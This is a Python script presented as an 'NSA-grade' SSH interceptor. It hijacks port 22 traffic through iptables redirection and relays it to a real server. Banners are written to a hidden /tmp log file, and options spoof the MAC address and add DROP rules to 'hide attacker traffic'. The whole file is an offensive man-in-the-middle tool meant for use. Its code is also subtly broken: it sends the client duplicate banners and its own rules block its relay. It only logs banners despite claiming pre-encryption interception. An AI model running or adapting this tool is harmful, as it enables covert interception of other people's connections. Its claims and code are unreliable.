#!/usr/bin/env python3
import os
import socket
import threading
import argparse
import signal
import sys
import random
import subprocess

# Config
LOGFILE = "/tmp/.ssh_intercept.log"
REAL_SSH_SERVER = "10.0.0.2"   # <-- Replace with real server
REAL_SSH_PORT = 22

# Globals
original_ip_forward = None
iptables_rules = []
threads = []

def log(msg):
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")

def cleanup():
    print("\n[!] Cleaning up and restoring settings...")
    if original_ip_forward is not None:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(original_ip_forward)
    for rule in iptables_rules:
        os.system(f"iptables -t nat -D {rule} 2>/dev/null")
        os.system(f"iptables -D {rule} 2>/dev/null")
    print("[+] Firewall and IP forwarding restored.")
    sys.exit(0)

def enable_ip_forwarding():
    global original_ip_forward
    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
        original_ip_forward = f.read().strip()
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def setup_iptables(intercept_port):
    rule = f"PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports {intercept_port}"
    os.system(f"iptables -t nat -A {rule}")
    iptables_rules.append(rule)

def make_invisible():
    os.system("iptables -A OUTPUT -p tcp --dport 22 -j DROP")
    os.system("iptables -A INPUT -p tcp --sport 22 -j DROP")
    iptables_rules.append("OUTPUT -p tcp --dport 22 -j DROP")
    iptables_rules.append("INPUT -p tcp --sport 22 -j DROP")

def spoof_mac(interface):
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0x7f) for _ in range(5))
    print(f"[+] Spoofing MAC address on {interface} → {mac}")
    os.system(f"ip link set dev {interface} down")
    os.system(f"ip link set dev {interface} address {mac}")
    os.system(f"ip link set dev {interface} up")

def relay(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except:
        pass
    finally:
        src.close()
        dst.close()

def handle_client(client_socket, addr):
    log(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        client_banner = client_socket.recv(1024).decode(errors="ignore")
        log(f"[CLIENT BANNER] {client_banner.strip()}")

        fake_banner = "SSH-2.0-OpenSSH_7.4p1 Ubuntu-10\n"
        client_socket.send(fake_banner.encode())

        real_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        real_socket.connect((REAL_SSH_SERVER, REAL_SSH_PORT))
        real_socket.send(client_banner.encode())

        server_banner = real_socket.recv(1024)
        log(f"[SERVER BANNER] {server_banner.decode(errors='ignore').strip()}")
        client_socket.send(server_banner)

        t1 = threading.Thread(target=relay, args=(client_socket, real_socket))
        t2 = threading.Thread(target=relay, args=(real_socket, client_socket))
        t1.start()
        t2.start()
        threads.extend([t1, t2])
    except Exception as e:
        log(f"[ERROR] {e}")

def run_interceptor(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(50)
    print(f"[+] Interceptor listening on port {port}")
    while True:
        client, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(client, addr))
        t.start()
        threads.append(t)

def main():
    parser = argparse.ArgumentParser(description="NSA-grade SSH Pre-Encryption Interceptor")
    parser.add_argument("--port", type=int, default=22, help="Local port to bind to")
    parser.add_argument("--invisible", action="store_true", help="Hide attacker traffic via iptables")
    parser.add_argument("--macspoof", metavar="IFACE", help="Spoof MAC address on interface")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, lambda sig, frame: cleanup())
    signal.signal(signal.SIGTERM, lambda sig, frame: cleanup())

    enable_ip_forwarding()
    setup_iptables(args.port)
    if args.invisible:
        make_invisible()
    if args.macspoof:
        spoof_mac(args.macspoof)

    run_interceptor(args.port)

if __name__ == "__main__":
    main()
